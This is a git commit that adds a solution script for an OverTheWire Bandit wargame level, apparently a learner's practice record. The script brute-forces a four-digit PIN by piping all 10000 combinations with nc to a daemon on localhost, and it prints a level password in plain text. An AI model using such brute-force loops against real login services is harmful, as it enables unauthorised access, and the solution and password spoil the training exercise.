ac9560ad3e73340148d2ef7a105c78f1aa720038
Mohammed Ismayil <mohammedismayil10@gmail.com>
2023-10-01 20:55:41 +0530

    Level 25 initiated

--- OverthewireWargame/Bandit/level_25.sh
+++ OverthewireWargame/Bandit/level_25.sh
@@ -1,3 +1,17 @@
 # Level Goal
 # A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
 # You do not need to create new connections each time
+
+
+#add this bash script
+#<--
+#!/bin/bash
+
+for i in {0000..9999}
+do
+        echo VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i >> possibilities.txt
+done
+
+cat possibilities.txt | nc localhost 30002 > result.txt
+
+#-->
